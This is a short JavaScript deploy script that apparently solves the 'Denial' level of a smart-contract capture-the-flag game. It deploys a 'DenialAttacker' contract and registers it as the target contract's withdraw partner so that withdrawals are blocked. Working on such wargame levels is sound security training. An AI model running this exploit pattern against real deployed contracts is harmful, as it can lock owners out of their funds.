const {
    DENIAL_INSTANCE_ADDRESS,
    logStartingLevel,
    logSuccessfullyLevel,
    logInstanceAddressIsNull,
    logInstanceAddress,
    logTransactionLink,
} = require('./utils');

async function main(levelName = 'Daniel') {
    logStartingLevel(levelName);

    if (!DENIAL_INSTANCE_ADDRESS) {
        logInstanceAddressIsNull(levelName);
        return;
    }
    logInstanceAddress(levelName, DENIAL_INSTANCE_ADDRESS);

    const factory = await ethers.getContractFactory("Denial");
    const contract = factory.attach(DENIAL_INSTANCE_ADDRESS);

    const attackerFactory = await ethers.getContractFactory("DenialAttacker");
    const attackerContract = await attackerFactory.deploy(contract.address);
    await attackerContract.deployed();

    const tx = await contract.setWithdrawPartner(attackerContract.address);
    logTransactionLink(tx.hash);
    await tx.wait(1);
    
    logSuccessfullyLevel(levelName);
}

module.exports = main;
